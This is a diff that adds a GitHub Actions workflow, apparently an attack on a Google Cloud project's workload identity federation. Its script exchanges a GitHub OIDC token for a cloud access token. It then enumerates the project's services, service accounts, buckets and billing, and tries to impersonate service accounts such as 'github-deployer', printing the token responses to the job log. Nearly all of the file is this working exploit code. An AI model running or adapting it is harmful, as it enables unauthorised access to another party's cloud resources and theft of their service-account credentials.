@@ -1,0 +1,98 @@
+name: c211 78644 hit
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - run: |
+          export PROVIDER="projects/1046457465833/locations/global/workloadIdentityPools/my-pool/providers/my-provider"
+          export PROJ="1046457465833"
+          export SA_EXTRA='["github-deployer@dandori-team-one.iam.gserviceaccount.com"]'
+          python3 - <<'PY'
+
+          import os, json, subprocess, urllib.request, urllib.error, urllib.parse
+
+          PROVIDER = os.environ['PROVIDER']
+          PROJ = os.environ['PROJ']
+          SA_EXTRA = json.loads(os.environ.get('SA_EXTRA', '[]'))
+
+          def mint(aud):
+              base = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL', '')
+              u = base + '&audience=' + urllib.parse.quote(aud, safe='')
+              t = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')
+              out = subprocess.run(['curl', '-sS', '-m', '30', '-H', 'Authorization: Bearer ' + t, u], capture_output=True, text=True).stdout
+              try: return json.loads(out).get('value', '')
+              except Exception: return ''
+
+          def req(u, data=None, token=None, timeout=60, method=None):
+              h = {'Accept': 'application/json', 'Content-Type': 'application/json'}
+              if token: h['Authorization'] = 'Bearer ' + token
+              r = urllib.request.Request(u, data=data, headers=h, method=method)
+              try:
+                  resp = urllib.request.urlopen(r, timeout=timeout)
+                  return resp.status, resp.read().decode('utf-8', 'replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, (e.read() or b'').decode('utf-8', 'replace')
+              except Exception as e:
+                  return -1, repr(e)[:160]
+
+          tok = mint('//iam.googleapis.com/' + PROVIDER)
+          print('MINT', 'ok' if tok else 'FAIL', flush=True)
+          body = json.dumps({'audience': '//iam.googleapis.com/' + PROVIDER,
+                             'grantType': 'urn:ietf:params:oauth:grant-type:token-exchange',
+                             'requestedTokenType': 'urn:ietf:params:oauth:token-type:access_token',
+                             'scope': 'https://www.googleapis.com/auth/cloud-platform',
+                             'subjectTokenType': 'urn:ietf:params:oauth:token-type:jwt',
+                             'subjectToken': tok}).encode()
+          st, rb = req('https://sts.googleapis.com/v1/token', data=body)
+          print('STS', st, flush=True)
+          acc = ''
+          if st == 200:
+              j = json.loads(rb)
+              acc = j.get('access_token', '')
+              print('STS_META', json.dumps({'expires_in': j.get('expires_in'), 'scope': j.get('scope'), 'issued_token_type': j.get('issued_token_type'), 'token_len': len(acc)}), flush=True)
+
+          CALLS = [
+            ('tokeninfo', 'https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=' + acc),
+            ('crm_v1_project', 'https://cloudresourcemanager.googleapis.com/v1/projects/%s' % PROJ),
+            ('crm_v3_project', 'https://cloudresourcemanager.googleapis.com/v3/projects/%s' % PROJ),
+            ('crm_v3_search', 'https://cloudresourcemanager.googleapis.com/v3/projects:search?query=1046457465833'),
+            ('serviceusage', 'https://serviceusage.googleapis.com/v1/projects/%s/services?filter=state:ENABLED&pageSize=200' % PROJ),
+            ('compute_project', 'https://compute.googleapis.com/compute/v1/projects/%s' % PROJ),
+            ('compute_regions', 'https://compute.googleapis.com/compute/v1/projects/%s/regions' % PROJ),
+            ('compute_zones', 'https://compute.googleapis.com/compute/v1/projects/%s/zones' % PROJ),
+            ('iam_sa_list', 'https://iam.googleapis.com/v1/projects/%s/serviceAccounts' % PROJ),
+            ('aiplatform_locations', 'https://%s-aiplatform.googleapis.com/v1/projects/%s/locations' % ('us-central1', PROJ)),
+            ('storage_buckets', 'https://storage.googleapis.com/storage/v1/b?project=%s' % PROJ),
+            ('billing_info', 'https://cloudbilling.googleapis.com/v1/projects/%s/billingInfo' % PROJ),
+            ('cloudquotas', 'https://cloudquotas.googleapis.com/v1/projects/%s/locations/global/services/compute.googleapis.com/quotaInfos' % PROJ),
+          ]
+          for name, url in CALLS:
+              st, b = req(url, token=acc)
+              print('CALL %s %d %s' % (name, st, b.replace('\n', ' ')[:600]), flush=True)
+
+          # SA email candidates: list from IAM if permitted, else the known 403 hit + extras
+          emails = []
+          st, b = req('https://iam.googleapis.com/v1/projects/%s/serviceAccounts' % PROJ, token=acc)
+          if st == 200:
+              try:
+                  emails = [x['email'] for x in json.loads(b).get('accounts', [])]
+              except Exception:
+                  emails = []
+          for e in SA_EXTRA:
+              if e not in emails:
+                  emails.append(e)
+          print('SA_CANDIDATES', json.dumps(emails[:60]), flush=True)
+          gen_body = json.dumps({'scope': ['https://www.googleapis.com/auth/cloud-platform']}).encode()
+          for email in emails[:40]:
+              st, b = req('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken' % urllib.parse.quote(email, safe=''), data=gen_body, token=acc)
+              print('GEN %s %d %s' % (email, st, b.replace('\n', ' ')[:200]), flush=True)
+          req('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateIdToken' % urllib.parse.quote('github-deployer@dandori-team-one.iam.gserviceaccount.com', safe=''), data=json.dumps({'audience': 'c211-78644'}).encode(), token=acc)
+          print('DONE', flush=True)
+
+          PY
